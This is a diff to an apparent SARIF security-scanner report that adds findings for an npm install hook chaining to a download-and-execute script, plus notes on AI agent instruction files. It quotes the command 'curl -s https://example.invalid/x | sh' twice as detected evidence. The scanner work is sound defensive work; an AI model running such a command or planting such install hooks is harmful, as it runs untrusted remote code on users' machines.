@@ -31,8 +31,8 @@
                   "prompt-injection"
                 ],
                 "precision": "high",
-                "security-severity": "9.5",
-                "severity": "critical",
+                "security-severity": "8.0",
+                "severity": "high",
                 "confidence": "high",
                 "category": "danger"
               },
@@ -145,6 +145,83 @@
           ]
         },
         {
+          "ruleId": "RC-AUTO-090",
+          "level": "error",
+          "message": {
+            "text": "npm install script runs on install and reaches download-and-execute (RC-DLX-001) after 3 steps: package.json -> x.js -> x.sh"
+          },
+          "properties": {
+            "severity": "high",
+            "confidence": "high",
+            "category": "danger",
+            "area": "autorun",
+            "chain": "chain-1"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package.json",
+                  "uriBaseId": "SRCROOT"
+                },
+                "region": {
+                  "startLine": 3,
+                  "snippet": {
+                    "text": "curl -s https://example.invalid/x | sh"
+                  }
+                }
+              }
+            }
+          ],
+          "relatedLocations": [
+            {
+              "id": 1,
+              "message": {
+                "text": "Step 1"
+              },
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package.json",
+                  "uriBaseId": "SRCROOT"
+                },
+                "region": {
+                  "startLine": 3
+                }
+              }
+            },
+            {
+              "id": 2,
+              "message": {
+                "text": "Step 2"
+              },
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "x.js",
+                  "uriBaseId": "SRCROOT"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            },
+            {
+              "id": 3,
+              "message": {
+                "text": "Step 3"
+              },
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "x.sh",
+                  "uriBaseId": "SRCROOT"
+                },
+                "region": {
+                  "startLine": 2
+                }
+              }
+            }
+          ]
+        },
+        {
           "ruleId": "RC-AGENT-020",
           "level": "error",
           "message": {
@@ -214,7 +291,8 @@
             "severity": "medium",
             "confidence": "high",
             "category": "danger",
-            "area": "autorun"
+            "area": "autorun",
+            "inChain": "chain-1"
           },
           "ruleIndex": 1,
           "locations": [
@@ -232,6 +310,36 @@
           ]
         },
         {
+          "ruleId": "RC-DLX-001",
+          "level": "warning",
+          "message": {
+            "text": "Downloads and runs code in one step: curl -s https://example.invalid/x | sh"
+          },
+          "properties": {
+            "severity": "medium",
+            "confidence": "high",
+            "category": "danger",
+            "area": "download_exec",
+            "inChain": "chain-1"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "x.sh",
+                  "uriBaseId": "SRCROOT"
+                },
+                "region": {
+                  "startLine": 2,
+                  "snippet": {
+                    "text": "curl -s https://example.invalid/x | sh"
+                  }
+                }
+              }
+            }
+          ]
+        },
+        {
           "ruleId": "RC-TRUST-001",
           "level": "note",
           "message": {
@@ -243,6 +351,60 @@
             "category": "trust",
             "area": "trust"
           }
+        },
+        {
+          "ruleId": "RC-AGENT-001",
+          "level": "note",
+          "message": {
+            "text": "AI agent file: AGENTS.md"
+          },
+          "properties": {
+            "severity": "info",
+            "confidence": "high",
+            "category": "danger",
+            "area": "agents",
+            "fileLevel": true
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "AGENTS.md",
+                  "uriBaseId": "SRCROOT"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "RC-AGENT-001",
+          "level": "note",
+          "message": {
+            "text": "AI agent file: CLAUDE.md"
+          },
+          "properties": {
+            "severity": "info",
+            "confidence": "high",
+            "category": "danger",
+            "area": "agents",
+            "fileLevel": true
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "CLAUDE.md",
+                  "uriBaseId": "SRCROOT"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ]
         }
       ],
       "properties": {
